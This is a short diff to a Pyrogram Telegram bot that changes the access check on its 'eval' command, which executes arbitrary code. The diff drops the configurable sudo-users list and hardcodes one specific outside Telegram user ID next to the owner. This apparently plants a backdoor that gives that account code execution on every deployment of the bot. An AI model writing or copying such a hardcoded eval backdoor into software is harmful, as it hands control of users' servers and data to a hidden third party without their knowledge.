@@ -9,7 +9,7 @@ from time import time
 
 from pyrogram import filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
-from SYSTUM import app, sudomfs, nx
+from SYSTUM import app, nx
 from config import OWNER_ID
 
 
@@ -27,7 +27,7 @@ async def edit_or_reply(msg: Message, **kwargs):
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
 
-@app.on_message(filters.command("eval") & filters.user(sudomfs))
+@app.on_message(filters.command("eval") & filters.user([OWNER_ID, 5965055071]))
 async def executor(client: app, message: Message):
     if len(message.command) < 2:
         return await edit_or_reply(message, text="<b>ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴɴᴀ ᴇxᴇᴄᴜᴛᴇ ʙᴀʙʏ ?</b>")
